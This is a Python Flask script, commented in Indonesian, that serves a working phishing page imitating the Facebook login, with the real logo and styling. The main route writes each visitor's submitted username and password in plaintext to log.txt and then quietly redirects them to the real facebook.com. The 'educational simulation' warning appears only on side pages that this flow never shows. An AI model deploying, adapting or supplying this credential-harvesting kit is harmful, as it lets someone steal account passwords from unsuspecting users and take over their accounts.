from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

# Data untuk Facebook
facebook = {
    'logo': 'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg',
    'color': '#1877f2',
    'name': 'Facebook'
}

# Gaya CSS untuk halaman
style = '''
<style>
body {
    font-family: 'Arial', sans-serif;
    background-color: #f0f2f5;
    text-align: center;
    padding-top: 50px;
}
h1, h2 {
    color: #333;
}
form {
    background: white;
    padding: 40px;
    display: inline-block;
    border-radius: 12px;
    box-shadow: 0 0 20px rgba(0,0,0,0.1);
    margin-top: 20px;
    width: 360px;
    text-align: left;
}
input[type=text], input[type=password] {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 6px;
    border: 1px solid #ccc;
    font-size: 14px;
}
input[type=text]:focus, input[type=password]:focus {
    outline: none;
    border: 1px solid #1877f2;
}
button {
    background-color: #1877f2;
    color: white;
    border: none;
    padding: 12px;
    width: 100%;
    margin-top: 10px;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
}
button:hover {
    background-color: #0b61d6;
}
.notice {
    margin-top: 30px;
    color: red;
    font-weight: bold;
}
.link {
    text-decoration: none;
    color: #333;
    font-size: 14px;
    margin-top: 15px;
    display: block;
    cursor: pointer;
}
.link:hover {
    color: #1877f2;
}

/* Menyesuaikan logo Facebook */
.platform-header {
    margin-bottom: 20px;
}
.platform-logo {
    width: 80px;  /* Ukuran logo */
    height: 80px; /* Menjaga proporsi */
    margin-top: 10px;
    margin-bottom: 15px;
    transition: transform 0.3s ease;
}
.platform-logo:hover {
    transform: scale(1.1);  /* Efek hover untuk logo */
}
</style>
'''

# Statistik login
login_attempts = 0

# Halaman login Facebook
login_page = '''
<!doctype html>
<title>Login - {{ platform_name }}</title>
''' + style + '''
<div class="platform-header">
    <img class="platform-logo" src="{{ platform_logo }}" alt="{{ platform_name }} Logo">
    <h2>Login ke {{ platform_name }}</h2>
</div>
<form method="POST">
    <input type="text" name="username" placeholder="Nomor telepon, username, atau email" required><br>
    <input type="password" name="password" placeholder="Kata sandi" required><br>
    <button type="submit">Masuk</button><br><br>
    <a class="link" href="#">Lupa kata sandi?</a>
    <a class="link" href="#">Buat akun baru</a>
</form>
'''

# Halaman loading / redirect setelah login
loading_page = '''
<!doctype html>
<title>Masuk...</title>
''' + style + '''
<h2>Masuk sedang diproses...</h2>
<p>Mohon tunggu, sedang memverifikasi data Anda...</p>
<!-- Meta tag untuk pengalihan setelah beberapa detik -->
<meta http-equiv="refresh" content="3;url=https://www.facebook.com">
'''

# Halaman dashboard setelah login sukses
dashboard_page = '''
<!doctype html>
<title>Beranda</title>
''' + style + '''
<h1>Selamat datang di Beranda!</h1>
<p>Anda berhasil login ke Facebook.</p>
<p>Ini hanya simulasi edukasi untuk memahami risiko phishing!</p>
<a href="/">Kembali ke Home</a>
'''

# Halaman untuk menampilkan data yang disadap
warning_page = '''
<!doctype html>
<title>PERINGATAN!</title>
''' + style + '''
<h2>Data Anda Telah Tertangkap!</h2>
<p>Berikut data yang berhasil disadap:</p>
<ul>
    <li><b>Username/Email:</b> {{ username }}</li>
    <li><b>Password:</b> {{ password }}</li>
</ul>
<p class="notice">Ini hanya simulasi! Jangan pernah masukkan data Anda di situs tidak resmi!</p>
<a href="/">Kembali ke Home</a>
'''

@app.route('/')
def home():
    return redirect('/facebook')

@app.route('/facebook', methods=['GET', 'POST'])
def login():
    global login_attempts
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Simpan ke log
        with open('log.txt', 'a') as file:
            file.write(f"[{datetime.datetime.now()}] Platform: Facebook\n")
            file.write(f"Username: {username}\n")
            file.write(f"Password: {password}\n\n")
        
        login_attempts += 1
        
        # Redirect ke halaman loading
        return render_template_string(loading_page)
    
    return render_template_string(login_page, platform_name=facebook['name'], platform_logo=facebook['logo'])

@app.route('/dashboard')
def dashboard():
    return render_template_string(dashboard_page)

@app.route('/success')
def success():
    return render_template_string(warning_page, username="exampleuser", password="examplepassword")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
